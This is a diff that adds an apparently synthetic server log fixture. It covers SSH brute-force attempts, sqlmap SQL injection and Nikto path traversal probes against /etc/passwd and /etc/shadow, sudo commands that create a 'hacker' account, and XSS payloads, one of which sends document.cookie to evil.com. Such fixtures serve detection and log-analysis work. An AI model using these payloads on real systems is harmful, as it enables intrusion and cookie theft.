@@ -1,0 +1,57 @@
+May 13 00:30:00 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55000 ssh2
+May 13 00:30:02 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55001 ssh2
+May 13 00:30:04 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55002 ssh2
+May 13 00:30:06 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55003 ssh2
+May 13 00:30:08 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55004 ssh2
+May 13 00:30:10 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55005 ssh2
+May 13 00:30:12 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55006 ssh2
+May 13 00:30:14 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55007 ssh2
+May 13 00:30:16 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55008 ssh2
+May 13 00:30:18 appserver sshd[30001]: Failed password for root from 198.51.100.99 port 55009 ssh2
+May 13 00:35:00 appserver sshd[30010]: Invalid user backup from 198.51.100.99 port 55100 ssh2
+May 13 00:35:02 appserver sshd[30010]: Failed password for invalid user backup from 198.51.100.99 port 55100 ssh2
+May 13 00:35:04 appserver sshd[30011]: Invalid user deploy from 198.51.100.99 port 55103 ssh2
+May 13 00:35:06 appserver sshd[30011]: Failed password for invalid user deploy from 198.51.100.99 port 55103 ssh2
+May 13 00:35:08 appserver sshd[30012]: Invalid user git from 198.51.100.99 port 55106 ssh2
+May 13 00:35:10 appserver sshd[30012]: Failed password for invalid user git from 198.51.100.99 port 55106 ssh2
+May 13 00:35:12 appserver sshd[30013]: Invalid user ansible from 198.51.100.99 port 55109 ssh2
+May 13 00:35:14 appserver sshd[30013]: Failed password for invalid user ansible from 198.51.100.99 port 55109 ssh2
+May 13 06:00:00 appserver sshd[30020]: Accepted publickey for devops from 192.168.10.5 port 50000 ssh2
+May 13 06:10:00 appserver sudo: devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/systemctl status app
+May 13 06:15:00 appserver sudo: devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/chmod 777 /var/www/uploads
+May 13 06:30:00 appserver sshd[30030]: Accepted password for developer from 192.168.10.12 port 50100 ssh2
+198.51.100.1 - - [13/May/2025:07:00:00 +0000] "GET /api/users?id=1' OR 1=1-- HTTP/1.1" 500 234 "-" "sqlmap/1.7"
+198.51.100.1 - - [13/May/2025:07:00:01 +0000] "GET /api/users?id=1 UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1" 500 234 "-" "sqlmap/1.7"
+198.51.100.1 - - [13/May/2025:07:00:02 +0000] "GET /api/products?cat='; DROP TABLE orders-- HTTP/1.1" 500 234 "-" "sqlmap/1.7"
+198.51.100.1 - - [13/May/2025:07:00:03 +0000] "GET /api/search?q=1' OR '1'='1 HTTP/1.1" 200 4532 "-" "sqlmap/1.7"
+198.51.100.1 - - [13/May/2025:07:00:04 +0000] "GET /api/items?id=1; SELECT SLEEP(5)-- HTTP/1.1" 200 4532 "-" "sqlmap/1.7"
+45.33.32.100 - - [13/May/2025:07:30:00 +0000] "GET /../../etc/passwd HTTP/1.1" 400 326 "-" "Nikto/2.1.6"
+45.33.32.100 - - [13/May/2025:07:30:01 +0000] "GET /..%2f..%2fetc/shadow HTTP/1.1" 400 326 "-" "Nikto/2.1.6"
+45.33.32.100 - - [13/May/2025:07:30:02 +0000] "GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 326 "-" "Nikto/2.1.6"
+45.33.32.100 - - [13/May/2025:07:30:03 +0000] "GET /uploads/../../../etc/cron.d HTTP/1.1" 404 196 "-" "Nikto/2.1.6"
+45.33.32.100 - - [13/May/2025:07:30:04 +0000] "GET /images/../../../../../../etc/passwd HTTP/1.1" 404 196 "-" "Nikto/2.1.6"
+192.168.10.5 - devops [13/May/2025:08:00:00 +0000] "GET /dashboard HTTP/1.1" 200 12345 "-" "Mozilla/5.0 (Linux)"
+192.168.10.5 - devops [13/May/2025:08:00:01 +0000] "GET /api/logs HTTP/1.1" 200 45678 "-" "Mozilla/5.0 (Linux)"
+May 13 08:00:00 appserver sshd[30040]: Failed password for root from 103.15.28.50 port 56000 ssh2
+May 13 08:00:02 appserver sshd[30040]: Failed password for root from 103.15.28.50 port 56001 ssh2
+May 13 08:00:04 appserver sshd[30040]: Failed password for root from 103.15.28.50 port 56002 ssh2
+May 13 08:00:06 appserver sshd[30040]: Failed password for root from 103.15.28.50 port 56003 ssh2
+May 13 08:00:08 appserver sshd[30040]: Failed password for root from 103.15.28.50 port 56004 ssh2
+May 13 08:00:10 appserver sshd[30040]: Failed password for root from 103.15.28.50 port 56005 ssh2
+May 13 09:00:00 appserver sudo: devops : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/visudo
+May 13 09:05:00 appserver sudo: devops : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/useradd -m hacker
+May 13 09:10:00 appserver sudo: devops : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/passwd hacker
+185.220.101.30 - - [13/May/2025:10:00:00 +0000] "GET /search?q=<script>fetch('https://evil.com?c='+document.cookie)</script> HTTP/1.1" 200 3456 "-" "curl/7.88.0"
+185.220.101.30 - - [13/May/2025:10:00:01 +0000] "POST /comment HTTP/1.1" 200 128 "-" "curl/7.88.0"
+185.220.101.30 - - [13/May/2025:10:00:02 +0000] "GET /profile?bio=<img src=x onerror=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 200 3456 "-" "curl/7.88.0"
+192.168.10.12 - developer [13/May/2025:11:00:00 +0000] "GET /api/internal/config HTTP/1.1" 200 2345 "-" "Mozilla/5.0 (Windows)"
+192.168.10.12 - developer [13/May/2025:11:30:00 +0000] "GET /api/internal/secrets HTTP/1.1" 403 89 "-" "Mozilla/5.0 (Windows)"
+May 13 12:00:00 appserver sshd[30050]: Accepted publickey for devops from 192.168.10.5 port 50200 ssh2
+May 13 12:15:00 appserver sudo: devops : TTY=pts/1 ; PWD=/opt ; USER=root ; COMMAND=/usr/bin/docker ps
+May 13 13:00:00 appserver sshd[30060]: Failed password for root from 198.51.100.99 port 57000 ssh2
+May 13 13:00:02 appserver sshd[30060]: Failed password for root from 198.51.100.99 port 57001 ssh2
+May 13 13:00:04 appserver sshd[30060]: Failed password for root from 198.51.100.99 port 57002 ssh2
+May 13 13:00:06 appserver sshd[30060]: Failed password for root from 198.51.100.99 port 57003 ssh2
+May 13 13:00:08 appserver sshd[30060]: Failed password for root from 198.51.100.99 port 57004 ssh2
+May 13 14:00:00 appserver sshd[30070]: Accepted password for developer from 192.168.10.12 port 50300 ssh2
+May 13 15:00:00 appserver sshd[30080]: Connection closed by 192.168.10.12 port 50300 [preauth]
